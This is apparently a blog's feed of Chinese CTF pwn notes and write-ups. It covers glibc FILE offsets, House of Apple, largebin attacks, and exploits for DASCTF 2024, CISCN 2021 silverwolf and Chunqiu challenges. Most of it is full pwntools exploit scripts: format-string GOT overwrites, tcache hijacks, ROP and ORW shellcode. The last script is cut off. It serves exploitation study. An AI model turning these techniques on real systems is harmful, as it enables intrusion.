+	PROTOBUF_C_TYPE_SFIXED64,   /**&lt; signed int64 (8 bytes) */
+	PROTOBUF_C_TYPE_UINT32,     /**&lt; unsigned int32 */
+	PROTOBUF_C_TYPE_FIXED32,    /**&lt; unsigned int32 (4 bytes) */
+	PROTOBUF_C_TYPE_UINT64,     /**&lt; unsigned int64 */
+	PROTOBUF_C_TYPE_FIXED64,    /**&lt; unsigned int64 (8 bytes) */
+	PROTOBUF_C_TYPE_FLOAT,      /**&lt; float */
+	PROTOBUF_C_TYPE_DOUBLE,     /**&lt; double */
+	PROTOBUF_C_TYPE_BOOL,       /**&lt; boolean */
+	PROTOBUF_C_TYPE_ENUM,       /**&lt; enumerated type */
+	PROTOBUF_C_TYPE_STRING,     /**&lt; UTF-8 or ASCII string */
+	PROTOBUF_C_TYPE_BYTES,      /**&lt; arbitrary byte sequence */
+	PROTOBUF_C_TYPE_MESSAGE,    /**&lt; nested message */
+} ProtobufCType;
+</code></pre>
+<p>field：<img src="https://l1u66.github.io//post-images/1722339033167.png" alt="" loading="lazy"><br>
+光标上一行的0xf即该field的PROTOBUF_C_TYPE_BYTES（bytes）类型（ProtobufCType从上往下，从0开始），名为whatcon，按照这样的方法依次提取出所有field，写到heybro.proto文件中<br>
+这里的heybro来自于结构体的name<br>
+<img src="https://l1u66.github.io//post-images/1722339333688.png" alt="" loading="lazy"></p>
+<pre><code>syntax=&quot;proto3&quot;; //proto version 2 or 3
+
+message heybro{
+    bytes whatcon = 1;
+    sint64 whattodo = 2;
+    sint64 whatidx = 3;
+    sint64 whatsize = 4;
+    uint32 whatsthis = 5;
+}
+</code></pre>
+<p>利用<code>protoc heybro.proto --python_out=./</code>命令生成python语言的代码，得到一个python文件，可以在exp中导入，构建相应的protobuf包</p>
+<pre><code>import heybro_pb2 # 不要加.py
+data = heybro_pb2.heybro() # 方法名称跟随.proto中结构体名称变化
+data.whattodo = todo
+data.whatcon = content
+data.whatidx = index
+data.whatsize = size
+data.whatsthis = this
+data.SerializeToString() # 转换成bytes
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[琐碎知识点]]></title>
+        <id>https://l1u66.github.io/post/suo-sui-zhi-shi-dian/</id>
+        <link href="https://l1u66.github.io/post/suo-sui-zhi-shi-dian/">
+        </link>
+        <updated>2024-07-25T10:26:27.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="io偏移表">IO偏移表</h1>
+<pre><code>0x0   _flags
+0x8   _IO_read_ptr
+0x10  _IO_read_end
+0x18  _IO_read_base
+0x20  _IO_write_base
+0x28  _IO_write_ptr
+0x30  _IO_write_end
+0x38  _IO_buf_base
+0x40  _IO_buf_end
+0x48  _IO_save_base
+0x50  _IO_backup_base
+0x58  _IO_save_end
+0x60  _markers
+0x68  _chain
+0x70  _fileno
+0x74  _flags2
+0x78  _old_offset
+0x80  _cur_column
+0x82  _vtable_offset
+0x83  _shortbuf
+0x88  _lock
+0x90  _offset
+0x98  _codecvt
+0xa0  _wide_data
+0xa8  _freeres_list
+0xb0  _freeres_buf
+0xb8  __pad5
+0xc0  _mode
+0xc4  _unused2
+0xd8  vtable
+</code></pre>
+<h1 id="tls">TLS</h1>
+<ul>
+<li>在gdb里使用<code>fsbase</code>命令可以找到TLS结构体的地址</li>
+<li><code>p &amp;tls_dtor_list</code>找到tls_dtor_list</li>
+</ul>
+<h2 id="直接拿到shell">直接拿到shell：</h2>
+<pre><code>ROL = lambda val, r_bits, max_bits: \
+    (val &lt;&lt; r_bits%max_bits) &amp; (2**max_bits-1) | \
+    ((val &amp; (2**max_bits-1)) &gt;&gt; (max_bits-(r_bits%max_bits)))
+ 
+# 两次largebin attack改tls_dtor_list与pointer_guard
+ 
+fake_pointer_guard = heap_base + 0x17b0
+edit(0, b'a'*0x420 + p64(ROL(libc.sym['system'] ^ fake_pointer_guard, 0x11, 64)) + p64(next(libc.search(b'/bin/sh'))))
+</code></pre>
+<h2 id="rop">rop:</h2>
+<p>把tls_dtor_list的头节点写为一个堆地址heap_address_ctr，然后在heap_address_ctr写入leave ret的gadget指针，这样，call rax 后，rip 指向了heap_address_ctr +8，我们就完成了栈的劫持，我们可以在这里布置rop。<br>
+#PIE<br>
+<code>gdb.attach(io,&quot;b *$rebase(0x16cc)&quot;)</code>开启pie下断点</p>
+<h1 id="magic-gadgets">magic gadgets</h1>
+<h2 id="svcudp_reply">svcudp_reply</h2>
+<pre><code>&lt;svcudp_reply+26&gt;:    mov    rbp,QWORD PTR [rdi+0x48]
+&lt;svcudp_reply+30&gt;:    mov    rax,QWORD PTR [rbp+0x18]
+&lt;svcudp_reply+34&gt;:    lea    r13,[rbp+0x10]
+&lt;svcudp_reply+38&gt;:    mov    DWORD PTR [rbp+0x10],0x0
+&lt;svcudp_reply+45&gt;:    mov    rdi,r13
+&lt;svcudp_reply+48&gt;:    call   QWORD PTR [rax+0x28]
+</code></pre>
+<p><code>ROPgadget --binary '/home/tutu/桌面/pwn/houseofcat/libc.so.6' --opcode 488b6f48488b4518</code></p>
+<h2 id="setcontext">setcontext</h2>
+<pre><code> 0x7fe165955a6d &lt;setcontext+61&gt;     mov    rsp, qword ptr [rdx + 0xa0]
+   0x7fe165955a74 &lt;setcontext+68&gt;     mov    rbx, qword ptr [rdx + 0x80]
+   0x7fe165955a7b &lt;setcontext+75&gt;     mov    rbp, qword ptr [rdx + 0x78]
+   0x7fe165955a7f &lt;setcontext+79&gt;     mov    r12, qword ptr [rdx + 0x48]
+   0x7fe165955a83 &lt;setcontext+83&gt;     mov    r13, qword ptr [rdx + 0x50]
+   0x7fe165955a87 &lt;setcontext+87&gt;     mov    r14, qword ptr [rdx + 0x58]
+   0x7fe165955a8b &lt;setcontext+91&gt;     mov    r15, qword ptr [rdx + 0x60]
+   0x7fe165955a8f &lt;setcontext+95&gt;     test   dword ptr fs:[0x48], 2
+   0x7fe165955a9b &lt;setcontext+107&gt;    je     setcontext+294                &lt;setcontext+294&gt;
+   ......
+   0x7fe165955b56 &lt;setcontext+294&gt;    mov    rcx, qword ptr [rdx + 0xa8]
+   0x7fe165955b5d &lt;setcontext+301&gt;    push   rcx
+   0x7fe165955b5e &lt;setcontext+302&gt;    mov    rsi, qword ptr [rdx + 0x70]
+   0x7fe165955b62 &lt;setcontext+306&gt;    mov    rdi, qword ptr [rdx + 0x68]
+   0x7fe165955b66 &lt;setcontext+310&gt;    mov    rcx, qword ptr [rdx + 0x98]
+   0x7fe165955b6d &lt;setcontext+317&gt;    mov    r8, qword ptr [rdx + 0x28]
+   0x7fe165955b71 &lt;setcontext+321&gt;    mov    r9, qword ptr [rdx + 0x30]
+   0x7fe165955b75 &lt;setcontext+325&gt;    mov    rdx, qword ptr [rdx + 0x88]
+   0x7fe165955b7c &lt;setcontext+332&gt;    xor    eax, eax
+   0x7fe165955b7e &lt;setcontext+334&gt;    ret
+</code></pre>
+<p><code>ROPgadget --binary '/home/tutu/桌面/pwn/houseofcat/libc.so.6' --opcode 488ba2a00000</code></p>
+<h1 id="其他好用的gadgets">其他好用的gadgets</h1>
+<ul>
+<li>通过rdi控制rax，并call</li>
+</ul>
+<pre><code>0x000000000015d65a : mov rax, qword ptr [rdi + 0x38] ; call qword ptr [rax + 0x10]
+0x000000000015d5c1 : mov rax, qword ptr [rdi + 0x38] ; call qword ptr [rax + 0x18]
+0x00000000001673c9 : mov rax, qword ptr [rdi + 0x38] ; call qword ptr [rax + 0x20]
+0x000000000015d50c : mov rax, qword ptr [rdi + 0x38] ; call qword ptr [rax + 8]
+</code></pre>
+<ul>
+<li>通过rdx控制rsp</li>
+</ul>
+<pre><code>0x000000000005a170 : mov rsp, rdx ; ret
+</code></pre>
+<ul>
+<li>通过rdi控制rdx，通过rax控制rsp，调用rdx（也可以栈迁移）</li>
+</ul>
+<pre><code>0x00000000001675b0 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[House of apple]]></title>
+        <id>https://l1u66.github.io/post/house-of-apple/</id>
+        <link href="https://l1u66.github.io/post/house-of-apple/">
+        </link>
+        <updated>2024-07-23T10:14:33.000Z</updated>
+        <content type="html"><![CDATA[<p>该打法一次largebin attack就能拿到shell，不可不称nb，据说高版本基本通杀，更是nb中的nb，另外还有一条_IO_obstack_jumps链，例题详情见 litctf2024-heap2.35<br>
+<a href="https://bbs.kanxue.com/thread-273832.htm#msg_header_h2_0">学习传送门</a></p>
+<h1 id="高版本230之后largebin-attack">高版本(2.30之后)Largebin attack</h1>
+<pre><code>if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))
+{
+    fwd = bck;
+    bck = bck-&gt;bk;
+    victim-&gt;fd_nextsize = fwd-&gt;fd;
+    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; // 1
+    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; // 2
+}
+else
+...
+</code></pre>
+<p>1.在largebin list中放入一个堆块A，并利用UAF等漏洞修改其内容为p64(0)*3 + p64(target_addr - 0x20)，也就是在bk_nextsize写入target_addr - 0x20</p>
+<p>2.释放一个大小略小于堆块A的堆块B进入到同一个largebin list，此时就会在target_addr中写入堆块B的地址<br>
+原理解释：源码中的bck就是largebin list的头部，而bck-&gt;fd就指向了其中size最小的堆块，将源码中1带入2中得：fwd-&gt;fd-&gt;bk_nextsize-&gt;fd_nextsize = victim，又在之前有fwd = bck，fwd-&gt;fd就是largebin list头部的fd，而此largebin list在加入堆块B之前只有堆块A，因此fwd-&gt;fd-&gt;bk_nextsize-&gt;fd_nextsize = victim就是堆块A的bk_nextsize-&gt;fd_nextsize也就是target_addr处写入了victim也就是堆块B的地址。</p>
+<h1 id="house-of-apple">House of apple</h1>
+<p>攻击的调用链：</p>
+<pre><code>_IO_wfile_overflow --&gt; _IO_wdoallocbuf --&gt; _IO_WDOALLOCATE
+</code></pre>
+<h2 id="攻击思路">攻击思路：</h2>
+<p>先利用Largebin attack劫持_IO_list_all结构体，将文件流劫持到堆上后，需要对fp的进行一些设置，如下：</p>
+<ul>
+<li>_flags设置为~(2 | 0x8 | 0x800)，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为 sh;，注意前面有两个空格</li>
+<li>vtable设置为_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap地址（加减偏移），使其能成功调用_IO_wfile_overflow即可</li>
+<li>_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A</li>
+<li>_wide_data-&gt;_IO_write_base设置为0，即满足*(A + 0x18) = 0</li>
+<li>_wide_data-&gt;_IO_buf_base设置为0，即满足*(A + 0x30) = 0</li>
+<li>_wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B</li>
+<li>_wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C</li>
+</ul>
+<pre><code>edit(8, b'A' * 0x10 + p32(0xfffff7f5) + b';sh\x00') # _flags标志位（int类型的）
+
+fake_io_file = p64(0)*2 + p64(1) + p64(2)
+fake_io_file = fake_io_file.ljust(
+    0xa0 - 0x10, b'\0') + p64(chunk_addr + 0x100)  # _wide_data (A)
+fake_io_file = fake_io_file.ljust(
+    0xc0 - 0x10, b'\0') + p64(0xffffffffffffffff)  # _mode
+fake_io_file = fake_io_file.ljust(
+    0xd8 - 0x10, b'\0') + p64(io_wfile_jumps)  # vtable
+fake_io_file = fake_io_file.ljust(
+    0x100 - 0x10 + 0xe0, b'\0') + p64(chunk_addr + 0x200)  # B
+fake_io_file = fake_io_file.ljust(
+    0x200 - 0x10, b'\0') + p64(0)*13 + p64(system)  # C
+</code></pre>
+<p>如果有能力直接改写stderr等结构体可以直接这样构造(就是可以直接改_flag位)</p>
+<pre><code>fake_file = flat({
+       0x0: b&quot;  sh;&quot;,
+       0x28: libc_base + libc.symbols['system'],
+       0x88: libc_base + libc.symbols['_environ']-0x10,
+       0xa0: libc_base+libc.symbols['_IO_2_1_stderr_']-0x40,   # _wide_data
+       0xD8: libc_base + libc.symbols['_IO_wfile_jumps'], # jumptable
+   }, filler=b&quot;\x00&quot;)
+</code></pre>
+<p>或者需要打orw<br>
+magic gadgets:</p>
+<pre><code>&lt;svcudp_reply+26&gt;:  mov  rbp,QWORD PTR [rdi+0x48]
+&lt;svcudp_reply+30&gt;:  mov  rax,QWORD PTR [rbp+0x18]
+&lt;svcudp_reply+34&gt;:  lea  r13,[rbp+0x10]
+&lt;svcudp_reply+38&gt;:  mov  DWORD PTR [rbp+0x10],0x0
+&lt;svcudp_reply+45&gt;:  mov  rdi,r13
+&lt;svcudp_reply+48&gt;:  call  QWORD PTR [rax+0x28]
+</code></pre>
+<p>将C的地址改为magic gadgets，此时执行到C时的rdi就是fp的地址，此时可以设计rbp的值和rax的值，[rax+0x28]设置为leave ret，就相当于一个栈迁移，在堆块中设置好orw便可构造执行</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[DASCTF 2024暑期挑战赛]]></title>
+        <id>https://l1u66.github.io/post/dasctf-2024-shu-qi-tiao-zhan-sai/</id>
+        <link href="https://l1u66.github.io/post/dasctf-2024-shu-qi-tiao-zhan-sai/">
+        </link>
+        <updated>2024-07-20T11:07:14.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="spring_board">spring_board</h1>
+<p>阅读程序发现是有五次的非栈上格式化字符串漏洞，用来计数的i变量位于栈上，只有五次的话要做到泄露libc地址，栈地址并且做到修改printf的got表为system不太够用，所以可以用格式化字符串漏洞把i变量给改掉，从而达到重置次数的目的，其他的思路和非栈上格式化字符串一样</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+
+p = process(&quot;./pwn&quot;)
+# p = remote('node5.buuoj.cn',27012)
+elf = ELF(&quot;./pwn&quot;)
+
+# stack libc
+p.sendlineafter(&quot;keyword\n&quot;,&quot;%11$p-%9$p&quot;)
+p.recvuntil(&quot;0x&quot;)
+stack = int(p.recv(12),16)
+ebp = stack - 232
+count = ebp - 4
+print(&quot;stack = &quot;,hex(stack))
+print(&quot;stack = &quot;,hex(ebp))
+p.recvuntil(&quot;0x&quot;)
+libc_base = int(p.recv(12),16) - 133184
+print(&quot;main = &quot;,hex(libc_base))
+sys = libc_base + 0x0000000000453A0
+print(&quot;sys = &quot;,hex(sys))
+cc = (count) &amp; 0xffff
+payload = b'%' + str(cc).encode(&quot;utf-8&quot;) + b'c' + b'%11$hn'
+p.sendlineafter(&quot;keyword\n&quot;,payload)
+
+payload = b'%c%37$hn'
+p.sendlineafter(&quot;keyword\n&quot;,payload)
+
+
+printf_got = 0x601028
+
+s1 = (ebp + 5*8) &amp; 0xffff
+s11 = s1 + 2
+payload = b'%' + str(s1).encode(&quot;utf-8&quot;) + b'c' + b'%25$hn'
+p.sendlineafter(&quot;keyword\n&quot;,payload)
+p.sendlineafter(&quot;keyword\n&quot;,&quot;%4136c%39$hn&quot;)
+
+payload = b'%c%37$hn'
+p.sendlineafter(&quot;keyword\n&quot;,payload)
+
+payload = b'%' + str(s11).encode(&quot;utf-8&quot;) + b'c' + b'%25$hn'
+p.sendlineafter(&quot;keyword\n&quot;,payload)
+p.sendlineafter(&quot;keyword\n&quot;,&quot;%96c%39$hhn&quot;)
+
+payload = b'%c%37$hn'
+p.sendlineafter(&quot;keyword\n&quot;,payload)
+
+s2 = (ebp + 8*8) &amp; 0xffff
+s22 = s2 + 2
+payload = b'%' + str(s2).encode(&quot;utf-8&quot;) + b'c' + b'%25$hn'
+p.sendlineafter(&quot;keyword\n&quot;,payload)
+p.sendlineafter(&quot;keyword\n&quot;,&quot;%4138c%39$hn&quot;)
+
+payload = b'%c%37$hn'
+p.sendlineafter(&quot;keyword\n&quot;,payload)
+
+payload = b'%' + str(s22).encode(&quot;utf-8&quot;) + b'c' + b'%25$hn'
+p.sendlineafter(&quot;keyword\n&quot;,payload)
+p.sendlineafter(&quot;keyword\n&quot;,&quot;%96c%39$hhn&quot;)
+
+payload = b'%c%37$hn'
+p.sendlineafter(&quot;keyword\n&quot;,payload)
+
+# gdb.attach(p)
+# pause()
+
+x1 = sys &amp; 0xffff
+payload = b'%' + str(x1).encode(&quot;utf-8&quot;) + b'c' + b'%13$hn'
+x2 = (sys &gt;&gt; 16) &amp; 0xffff
+payload += b'%' + str(0x10000 + x2 - x1).encode(&quot;utf-8&quot;) + b'c' + b'%16$hn'
+p.sendlineafter(&quot;keyword\n&quot;,payload)
+
+p.sendafter(&quot;keyword\n&quot;,&quot;/bin/sh\x00&quot;)
+
+p.interactive()
+</code></pre>
+<h1 id="magicbook">magicbook</h1>
+<p>用Largebin attack修改读入的数据长度，开了沙盒禁用了execve，就是个栈溢出打orw</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+
+r = process(&quot;./pwn&quot;)
+# p = remote('node5.buuoj.cn',27012)
+elf = ELF(&quot;./pwn&quot;)
+libc = elf.libc
+
+def choice(cmd):
+	r.sendlineafter(&quot;choice:\n&quot;,str(cmd).encode())
+
+def add(size):
+    choice(1)
+    r.recvuntil(b'need?\n')
+    r.sendline(str(size).encode())
+
+
+def delete(idx,content = b'',flag = -1):
+    choice(2)
+    r.recvuntil(b'delete?\n')
+    r.sendline(str(idx).encode())
+    if(flag==-1):
+    	r.sendlineafter(&quot;deleted?(y/n)\n&quot;,b'n')
+    else:
+    	r.sendlineafter(&quot;deleted?(y/n)\n&quot;,b'y')
+    	r.sendlineafter(&quot;write?\n&quot;,b'0')
+    	r.sendlineafter(&quot;content: \n&quot;,content)
+
+
+def edit(pay):
+    choice(3)
+    r.recvuntil(b'story!\n')
+    r.sendline(pay)
+
+r.recvuntil(b'gift: ')
+
+book = int(r.recv(14),16) - 0x4010 + 0x4050
+add(0x460)#0
+add(0x20)#1
+add(0x450)#2
+
+delete(0)
+add(0x500)#3
+
+pay = p64(0xff)*2 + p64(book - 0x20)
+delete(2,pay,0)
+
+add(0x500)#4
+print(&quot;book = &quot;,hex(book))
+
+bss_base = book - 16464
+bss = book + 0x600
+
+# ----------------------------------------------------
+puts_plt = bss_base + 0x000000000001140
+puts_got = bss_base + 0x000000000003F88
+main_addr = bss_base + 0x0000000000015F9
+rdi_ret = bss_base + 0x0000000000001863
+rsi_r15_ret = bss_base + 0x0000000000001861
+vuln = bss_base + 0x15E6
+
+
+payload1 = b'a'*0x28 + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln)
+edit(payload1)
+libc.address = u64(r.recv(6).ljust(8,b'\x00'))-libc.symbols['puts']
+print('libc:',hex(libc.address))
+rdx_r12_ret = libc.address+0x000000000011f2e7
+# gdb.attach(r)
+payload2 = b'a'*0x28 + p64(rdi_ret) + p64(0) + p64(rsi_r15_ret) + p64(bss)*2 + p64(rdx_r12_ret) + p64(0x100)*2 + p64(libc.symbols['read'])
+payload2 += p64(rdi_ret) + p64(bss) + p64(rsi_r15_ret) + p64(0)*2 + p64(rdx_r12_ret) + p64(0)*2 + p64(libc.symbols['open'])
+payload2 += p64(rdi_ret) + p64(3) + p64(rsi_r15_ret) + p64(bss)*2 + p64(rdx_r12_ret) + p64(0x100)*2 + p64(libc.symbols['read'])
+payload2 += p64(rdi_ret) + p64(bss) + p64(libc.symbols['puts'])
+r.send(payload2)
+r.send('./flag\x00')
+r.interactive()
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CISCN_2021_silverwolf]]></title>
+        <id>https://l1u66.github.io/post/ciscn_2021_silverwolf/</id>
+        <link href="https://l1u66.github.io/post/ciscn_2021_silverwolf/">
+        </link>
+        <updated>2024-07-16T12:44:45.000Z</updated>
+        <content type="html"><![CDATA[<p>2.27的libc，开了沙盒得打orw，程序存在uaf漏洞，只能对一个chunk进行操作，并且还有大小限制，不能超过0x78，攻击思路：</p>
+<p>1.泄露libc和heap基地址:由于有大小限制，所以需要劫持tcache_perthread_struct 结构体，把0x250大小的count修改为7，释放劫持到该结构体的chunk到unsortedbins，从而泄露libc基地址<br>
+2.劫持tcache_perthread_struct 结构体，在堆中布置orw的ROPchain和flag字符串<br>
+3.劫持free hook为setcontext+53，从而控制rsp到布置的orw上（setcontext感觉就相当于布置rsp的值然后ret，从而实现控制执行流）</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+import sys
+import os
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+
+io = process('./pwn')
+# io = remote('node4.anna.nssctf.cn',28025)
+libc = ELF('libc-2.27.so')
+
+
+def choice(idx):
+    io.recvuntil(b'choice: ')
+    io.sendline(str(idx))
+
+
+def add(size):
+    choice(1)
+    io.sendlineafter(b'Index: ', str(0))
+    io.sendlineafter(b'Size: ', str(size))
+
+
+def edit(content):
+    choice(2)
+    io.sendlineafter(b'Index: ', str(0))
+    io.sendlineafter(b'Content: ', content)
+
+
+def free():
+    choice(4)
+    io.sendlineafter(b'Index: ', str(0))
+
+
+def show():
+    choice(3)
+    io.sendlineafter(b'Index: ', str(0))
+# 泄露libc,heap
+add(0x78)
+free()
+show()
+heap_base = u64(io.recvuntil(b'\x55')[-6:].ljust(8, b'\x00')) - 4512
+print('heap_base',hex(heap_base))
+tcache = heap_base
+edit(p64(tcache))
+add(0x78)
+add(0x78)
+edit(p64(0)*4 + b'\x00'*3 + b'\x07')
+free()
+show()
+libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 4111520
+print('libc_base',hex(libc_base))
+edit(p64(0)*4 + b'\x00'*4)
+free_hook = libc_base + libc.sym['__free_hook']
+flag_addr = heap_base + 0x1000
+
+orw1 = heap_base + 0x3000
+orw2 = heap_base + 0x3060
+
+stack_pivot_1 = heap_base + 0x2000
+stack_pivot_2 = heap_base + 0x20A0
+
+payload = b'\x00' * 0x40
+payload += p64(free_hook)  # 0x20
+payload += p64(0)
+payload += p64(flag_addr)
+payload += p64(stack_pivot_1)
+payload += p64(stack_pivot_2)
+payload += p64(orw1)
+payload += p64(orw2)
+
+edit(payload)
+# orw
+# Open
+
+orw = p64(pop_rdi) + p64(flag_addr)
+orw += p64(pop_rax) + p64(2)
+orw += p64(pop_rsi) + p64(0)
+orw += p64(syscall) # open('./flag')
+
+# Read
+
+orw += p64(pop_rdi) + p64(3)
+orw += p64(pop_rsi) + p64(orw1)
+orw += p64(pop_rdx) + p64(0x30)
+orw += p64(read) # read(3, orw1, 0x30)
+
+# Write
+
+orw += p64(pop_rdi) + p64(1)
+orw += p64(write) # write(1, orw1, 0x30)
+
+add(0x18)
+edit(p64(setcontext))
+add(0x38)
+edit('./flag')
+add(0x68)
+edit(orw[:0x60])
+add(0x78)
+edit(orw[0x60:])
+add(0x58)
+edit(p64(orw1) + p64(ret))
+add(0x48)
+free()
+
+gdb.attach(io)
+
+io.interactive()
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[春秋杯夏季赛]]></title>
+        <id>https://l1u66.github.io/post/chun-qiu-bei-xia-ji-sai/</id>
+        <link href="https://l1u66.github.io/post/chun-qiu-bei-xia-ji-sai/">
+        </link>
+        <updated>2024-07-07T11:04:27.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="shuffled_execution">Shuffled_Execution</h1>
+<p>就是写个shehllcode，但是有个随机交换字节，可以在前面输入0x00绕过strlen从而绕过随机交换，后面就是沙盒orw，<img src="https://l1u66.github.io//post-images/1720350450536.png" alt="" loading="lazy"><br>
+用openat，mmap/preadv2 ，writev绕过<br>
+<code>preadv2(vararg_0=3, vararg_1=0x1337090, vararg_2=1, vararg_3=0, vararg_4=0)</code><br>
+第二个参数实际上是一个结构体，包含着写入地址和读取长度，就相当于原来read的二参和三参<br>
+<code>writev(fd=1, iovec=0x1337090, count=1)</code></p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+import ctypes
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+	
+# r = remote(&quot;8.147.132.12&quot;,42557)
+r = process(&quot;./vuln&quot;)
+gdb.attach(r)
+
+p = b'\x00PP'
+shellcode = asm('''
+		/* openat(fd=-0x64, file='flag', oflag=0) */
+        add rax, 0x62
+        mov r12, rax
+        mov rsi, rax
+        mov rdi, -0x64
+        /* call openat() */
+        mov rax, 0x101 /* 0x101 */
+        syscall
+        /* preadv2(vararg_0=3, vararg_1=0x1337090, vararg_2=1, vararg_3=0, vararg_4=0) */
+        mov rdi, 3
+        mov rdx, 0x1
+        add r12, 0x15
+        mov rsi, r12
+        /* call preadv2() */
+        mov rax, 327
+        syscall
+        /* writev(fd=1, iovec=0x1337090, count=1) */
+        mov rdi, 1
+        mov rdx, 0x1
+        /* call writev() */
+        mov rax, 0x14
+        syscall
+''')
+
+p += shellcode + b'\x00' * 0x10 + b'flag\x00' + b'\x00' * 0x10 + p64(0x1337090) + p64(0x100)
+r.sendlineafter(b'entrance', p)
+r.interactive()
+</code></pre>
+<p>下面是用的测信道代替的write，但是远端连接可能不太稳定，一直没通（比赛的时候不知有writev函数，悲）</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+
+#openat(0xffffff9c,flag,0)
+#pread(3,0x114514000,0x100,0)
+
+payload = asm('''
+	mov rbp,0x1337800
+	mov rsp,rbp
+	''')
+payload += asm(shellcraft.openat(0xffffff9c,b&quot;flag&quot;,0))
+payload += asm(shellcraft.mmap(0x1337000,0x100,1,1,'eax',0))
+payload += asm('''
+	mov rsi,rax
+	''')
+
+def exp(dis,char):
+	pay = payload	
+	pay += asm('''
+		mov dl, byte ptr [rsi+{}]
+        mov bl, {}
+        cmp bl,dl
+        jz loop
+        mov rax,60
+		mov rdi,0x0
+        syscall
+        loop:
+        jmp loop
+	'''.format(dis,char))
+	print(len(pay))#87 
+	print(pay)
+	p.sendafter(&quot;entrance.\n&quot;,pay)
+	
+flag = &quot;&quot;
+# p = remote(&quot;8.147.132.12&quot;,42557)
+# p = process(&quot;./vuln&quot;)
+# gdb.attach(p)
+# exp(0,0)
+# p.interactive()
+
+for i in range(len(flag),50):
+	sleep(1)
+	print(&quot;flag : {}&quot;.format(flag))
+	for j in range(0x20,0x80):
+		# p = remote(&quot;8.147.132.12&quot;,42557)
+		p = process(&quot;./vuln&quot;)
+		try:
+			exp(i,j)
+			p.recvline(timeout=1)
+			flag += chr(j)
+			print(&quot;flag : &quot;,flag)
+			log.success(&quot;{} pos : {} success&quot;.format(i,chr(j)))
+			p.close()
+			break
+		except:           
+			p.close()
+</code></pre>
+<h1 id="stdout">stdout</h1>
+<p>这不就是ciscn2024东北赛区的原题？？？<br>
+输出被设置为全缓冲区，只有当缓冲区被填满时才会进行I/O操作</p>
+<pre><code>void __fastcall init()
+{
+  setvbuf(stdout, 0LL, 0, 0LL);
+  setvbuf(stdin, 0LL, 2, 0LL);
+</code></pre>
+<p>这里介绍下setvbuf函数，它有三种mode：<br>
+全缓冲：0，缓冲区满 或 调用fflush() 后输出缓冲区内容。<br>
+行缓冲：1，缓冲区满 或 遇到换行符 或 调用fflush() 后输出缓冲区内容。<br>
+无缓冲：2，直接输出。</p>
+<p>也可以通过一下方式进行手动刷新缓冲区从而输出缓冲区中的内容：<br>
+1.显式调用fflush函数<br>
+2.流被关闭（调用fclose）<br>
+3.程序正常结束（调用exit）</p>
+<pre><code>__int64 extend()
+{
+  __int64 result; // rax
+  char s[8]; // [rsp+0h] [rbp-30h] BYREF
+  __int64 v2; // [rsp+8h] [rbp-28h]
+  __int64 v3; // [rsp+10h] [rbp-20h]
+  __int64 v4; // [rsp+18h] [rbp-18h]
+  int v5; // [rsp+28h] [rbp-8h]
+  int v6; // [rsp+2Ch] [rbp-4h]
+
+  puts(&quot;Just to increase the number of got tables&quot;);
+  *(_QWORD *)s = '!olleh';
+  v2 = 0LL;
+  v3 = 0LL;
+  v4 = 0LL;
+  v6 = strlen(s);
+  if ( strcmp(s, &quot;hello!&quot;) )
+    exit(0);
+  puts(&quot;hello!&quot;);
+  srand(1u);
+  v5 = 0;
+  result = (unsigned int)(rand() % 16);
+  v5 = result;
+  return result;
+}
+</code></pre>
+<p>程序其他部分包括vuln extend，vuln目的是进行更大长度的栈溢出，而extend是为了向输出缓冲区填入更多内容加快填满输出缓冲区，因为直接通过输出一个地址来填满输出缓冲区会由于连接不稳定而无法打通远程（悲，同样由于远端连接不稳定没通）</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+# context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+context.log_level = 'debug'
+
+p = process('./pwn')
+# p = remote('8.147.134.120', 23067)
+# elf = ELF('pwn')
+# libc = ELF('libc-2.31.so')
+
+puts_plt = 0x0000000004010B0
+puts_got = 0x000000000404018
+backdoor = 0x40125D
+pop_rdi = 0x00000000004013d3
+pop_rsi_r15 = 0x00000000004013d1
+extend = 0x401287
+ret = 0x00000000040136E
+
+pay = b'a'*0x50 + p64(0xdeadbeaf) + p64(0x40125D)
+p.send(pay)
+# gdb.attach(p)
+# leak libc
+for i in range(3):#1748
+   payload = b'a' * (0x20) + b'deadbeef' + p64(ret) + p64(extend) * 54 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(backdoor)
+   p.send(payload)
+
+libc_base = u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b'\x00')) - 0x875a0
